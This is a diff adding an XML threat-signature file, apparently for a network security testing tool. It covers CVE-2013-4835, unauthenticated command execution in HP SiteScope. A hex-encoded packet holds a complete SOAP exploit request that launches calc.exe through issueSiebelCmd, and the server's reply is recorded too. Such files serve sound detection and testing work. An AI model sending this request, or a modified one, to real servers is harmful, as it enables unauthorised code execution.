@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="HP SiteScope issueSiebelCmd SOAP Request Code Execution"/>
+    <EngDesc display="true" value="A command execution vulnerability has been found in HP SiteScope. The vulnerability is due to lack of authentication when handling &amp;quot;issueSiebelCmd&amp;quot; SOAP requests. A remote unauthenticated attacker can exploit this vulnerability by sending crafted requests to the affected service. Successful exploitation of these vulnerabilities can lead to arbitrary command execution."/>
+    <Intent display="true">
+      <item value="ACCESS_CONTROL_WEAKNESS"/>
+    </Intent>
+    <Protocol display="true" value="SOAP/HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="Critical"/>
+    <Known_Vendors_Affected display="true">
+      <item value="HP"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="SiteScope"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="prior_to_11.22"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20131101-04"/>
+    <CVEID display="true" value="CVE-2013-4835"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="99230"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="5cbd45a8d8c56e950c51e8f26af6bb06"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="network"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635328132353846429"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1397208625" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+    <for index="B">
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:50:56:B4:0E:F0" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="02D6" Identification="B072" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="2603" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="52168" destPort="$HTTPdestPort" SeqNumber="80836A22" AckNumber="05F6707D" HeaderLength="08" WindowSize="002E" Checksum="BC18" UrgentPointer="0000" Options="0101080AF447DA5400000000" Payload="504F5354202F5369746553636F70652F73657276696365732F4150495369746553636F7065496D706C20485454502F312E310D0A436F6E74656E742D547970653A20746578742F786D6C3B20636861727365743D7574662D380D0A486F73743A203137322E31362E382E3133383A383038300D0A534F4150416374696F6E3A2022220D0A436F6E74656E742D4C656E6774683A203531390D0A0D0A3C3F786D6C2076657273696F6E3D27312E302720656E636F64696E673D275554462D38273F3E0A202020203C736F6170656E763A456E76656C6F706520786D6C6E733A736F6170656E763D22687474703A2F2F736368656D61732E786D6C736F61702E6F72672F736F61702F656E76656C6F70652F2220786D6C6E733A7873643D22687474703A2F2F7777772E77332E6F72672F323030312F584D4C536368656D61220A20202020786D6C6E733A7873693D22687474703A2F2F7777772E77332E6F72672F323030312F584D4C536368656D612D696E7374616E6365223E0A202020203C736F6170656E763A426F64793E0A2020202020203C696D706C3A697373756553696562656C436D6420786D6C6E733A696D706C3D27687474703A2F2F4170692E6672657368746563682E434F4D273E0A20202020202020203C696E30207873693A747970653D277873643A737472696E672720786D6C6E733A7873693D27687474703A2F2F7777772E77332E6F72672F323030312F584D4C536368656D612D696E7374616E6365273E633A5C77696E646F77735C73797374656D33325C63616C632E657865202F7520666F6F202F7020626172203C2F696E303E0A2020202020203C2F696D706C3A697373756553696562656C436D643E0A202020203C2F736F6170656E763A426F64793E0A202020203C2F736F6170656E763A456E76656C6F70653E" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:50:56:B4:0E:F0" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="03C4" Identification="7B26" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="1A61" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="52168" SeqNumber="05F6707D" AckNumber="80836CC5" HeaderLength="08" WindowSize="FD5D" Checksum="5BEC" UrgentPointer="0000" Options="0101080A0025266AF4480164" Payload="485454502F312E3120323030204F4B0D0A5365727665723A204170616368652D436F796F74652F312E310D0A5365742D436F6F6B69653A204A53455353494F4E49443D36454331334445323141413630373036374637373335343532423037303334463B20506174683D2F5369746553636F70650D0A436F6E74656E742D547970653A20746578742F786D6C3B636861727365743D7574662D380D0A5472616E736665722D456E636F64696E673A206368756E6B65640D0A446174653A205468752C203037204E6F7620323031332031373A30383A353820474D540D0A0D0A3261610D0A3C3F786D6C2076657273696F6E3D22312E302220656E636F64696E673D227574662D38223F3E3C736F6170656E763A456E76656C6F706520786D6C6E733A736F6170656E763D22687474703A2F2F736368656D61732E786D6C736F61702E6F72672F736F61702F656E76656C6F70652F2220786D6C6E733A7873643D22687474703A2F2F7777772E77332E6F72672F323030312F584D4C536368656D612220786D6C6E733A7873693D22687474703A2F2F7777772E77332E6F72672F323030312F584D4C536368656D612D696E7374616E6365223E3C736F6170656E763A426F64793E3C6E73313A697373756553696562656C436D64526573706F6E736520736F6170656E763A656E636F64696E675374796C653D22687474703A2F2F736368656D61732E786D6C736F61702E6F72672F736F61702F656E636F64696E672F2220786D6C6E733A6E73313D22687474703A2F2F4170692E6672657368746563682E434F4D223E3C697373756553696562656C436D6452657475726E20687265663D2223696430222F3E3C2F6E73313A697373756553696562656C436D64526573706F6E73653E3C6D756C74695265662069643D226964302220736F6170656E633A726F6F743D22302220736F6170656E763A656E636F64696E675374796C653D22687474703A2F2F736368656D61732E786D6C736F61702E6F72672F736F61702F656E636F64696E672F22207873693A747970653D226E73323A566563746F722220786D6C6E733A736F6170656E633D22687474703A2F2F736368656D61732E786D6C736F61702E6F72672F736F61702F656E636F64696E672F2220786D6C6E733A6E73323D22687474703A2F2F786D6C2E6170616368652E6F72672F786D6C2D736F6170222F3E3C2F736F6170656E763A426F64793E3C2F736F6170656E763A456E76656C6F70653E0D0A300D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
